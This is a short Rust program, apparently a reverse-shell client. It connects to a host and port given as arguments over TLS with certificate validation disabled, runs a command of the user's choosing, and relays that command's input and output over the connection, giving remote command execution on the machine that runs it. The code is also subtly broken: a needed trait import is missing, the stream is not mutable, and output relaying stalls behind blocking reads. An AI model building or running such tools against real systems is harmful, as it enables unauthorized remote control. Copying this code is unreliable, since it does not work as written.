use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::thread;
use native_tls::TlsConnector;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 4 {
        eprintln!("Usage: {} <host> <port> <command> [arguments]", args[0]);
        std::process::exit(1);
    }

    let host = &args[1];
    let port = &args[2];
    let command = &args[3];
    let arguments: Vec<&str> = if args.len() > 4 { args[4..].iter().map(|s| s.as_str()).collect() } else { Vec::new() };

    let addr = format!("{}:{}", host, port);
    let stream = TcpStream::connect(&addr).unwrap_or_else(|e| {
        eprintln!("Failed to connect to the server: {}", e);
        std::process::exit(1);
    });
    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap_or_else(|e| {
            eprintln!("Failed to create TLS connector: {}", e);
            std::process::exit(1);
        });
    let stream = connector.connect(host, stream).unwrap_or_else(|e| {
        eprintln!("Failed to establish TLS connection: {}", e);
        std::process::exit(1);
    });

    let mut child = Command::new(command)
        .args(&arguments)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap_or_else(|e| {
            eprintln!("Failed to execute command: {}", e);
            std::process::exit(1);
        });

    let child_stdin = child.stdin.take().unwrap();
    let child_stdout = child.stdout.take().unwrap();
    let child_stderr = child.stderr.take().unwrap();

    let (tx, rx) = mpsc::channel();
    let tx2 = tx.clone();

    let stdout_thread = thread::spawn(move || {
        let reader = BufReader::new(child_stdout);
        for line in reader.lines() {
            match line {
                Ok(line) => tx.send(line).unwrap_or_else(|e| eprintln!("Failed to send line: {}", e)),
                Err(e) => eprintln!("Failed to read line from stdout: {}", e),
            }
        }
    });

    let stderr_thread = thread::spawn(move || {
        let reader = BufReader::new(child_stderr);
        for line in reader.lines() {
            match line {
                Ok(line) => tx2.send(line).unwrap_or_else(|e| eprintln!("Failed to send line: {}", e)),
                Err(e) => eprintln!("Failed to read line from stderr: {}", e),
            }
        }
    });

    let network_thread = thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            match stream.read(&mut buffer) {
                Ok(size) => {
                    if size == 0 {
                        break;
                    }
                    child_stdin.write_all(&buffer[..size]).unwrap_or_else(|e| eprintln!("Failed to write to stdin: {}", e));
                }
                Err(e) => {
                    eprintln!("Failed to read from stream: {}", e);
                    break;
                }
            }

            if let Ok(line) = rx.try_recv() {
                writeln!(stream, "{}", line).unwrap_or_else(|e| eprintln!("Failed to write to stream: {}", e));
                stream.flush().unwrap_or_else(|e| eprintln!("Failed to flush stream: {}", e));
            }
        }
    });

    stdout_thread.join().unwrap();
    stderr_thread.join().unwrap();
    network_thread.join().unwrap();
}
